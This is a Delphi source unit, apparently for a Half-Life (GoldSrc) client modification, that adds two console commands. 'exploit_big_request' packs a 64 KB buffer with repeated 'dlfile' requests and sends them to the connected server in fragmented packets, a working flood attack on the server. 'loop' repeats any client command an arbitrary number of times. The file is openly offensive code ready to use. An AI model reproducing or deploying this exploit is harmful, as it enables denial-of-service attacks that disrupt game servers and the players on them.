unit Main.Exploits;

{$I Default.inc}

interface

procedure Init;

implementation

uses
  System.SysUtils,
  System.Math,

  Xander.Memoria,

  GoldSrc.SDK,

  Main.Global;

procedure CL_BigDownloadRequest_f; cdecl;
const
  // clc_stringcmd + Length('upload') + Length(' ') + Length('!MD5') + Length(' ') + Length(md5) + Length(\n);
  SingleCmdSize = 1 + 6 + 1 + 4 + 1 + 32 + 1;
var
  MsgData: array[0..65535] of Byte;
  Msg: sizebuf_t;
  Cmd: array[0..255] of AnsiChar;
  Sent: Integer;
begin
  if CS^.state <> ca_active then
  begin
    Engine^.Con_Printf('Can''t %s, not connected'#10, Engine^.Cmd_Argv(0));
    Exit;
  end;
  
  if Engine^.Cmd_Argc < 2 then
  begin
    Engine^.Con_Printf('Syntax: %s <File Name>'#10, Engine^.Cmd_Argv(0));
    Exit;
  end;
  
  Msg.buffername := 'Big Download Request';
  Msg.flags := 0;
  Msg.data := @MsgData;
  Msg.maxsize := SizeOf(MsgData);
  Msg.cursize := 0;

  StrFmt(Cmd, #3'dlfile %s'#10, [Engine^.Cmd_Argv(1)]);
  
  Sent := 0;
  while Msg.cursize + SingleCmdSize < Msg.maxsize do
  begin
    MSG_WriteString(Msg, Cmd);
    Inc(Sent);
  end;

  if Msg.cursize > 0 then
  begin
    Netchan_CreateFragments(False, CS^.netchan, Msg);
    Netchan_FragSend(CS^.netchan);
  end;

  Engine^.Con_Printf('Sent %d dlfile commands.'#10, Sent);
end;

procedure Cmd_Loop_f; cdecl;
var
  I: Integer;
  Count: Integer;
  Cmd: PAnsiChar;
begin
  if Engine^.Cmd_Argc < 3 then
  begin
    Engine^.Con_Printf('Syntax: %s <Count> <Command>'#10, Engine^.Cmd_Argv(0));
    Exit;
  end;

  if not TryStrToInt(Engine^.Cmd_Argv(1), Count) or (Count <= 0) then
  begin
    Engine^.Con_Printf('Invalid count value'#10);
    Exit;
  end;

  Cmd := Engine^.Cmd_Argv(2);
  if (Cmd = nil) or (Cmd^ = #0) then
  begin
    Engine^.Con_Printf('Invalid command value'#10);
    Exit;
  end;  

  for I := 0 to Count - 1 do
    Engine^.pfnClientCmd(Cmd);
end;

procedure Init;
begin
  Engine^.pfnAddCommand('exploit_big_request', CL_BigDownloadRequest_f);
  Engine^.pfnAddCommand('loop', Cmd_Loop_f);
end;

end.
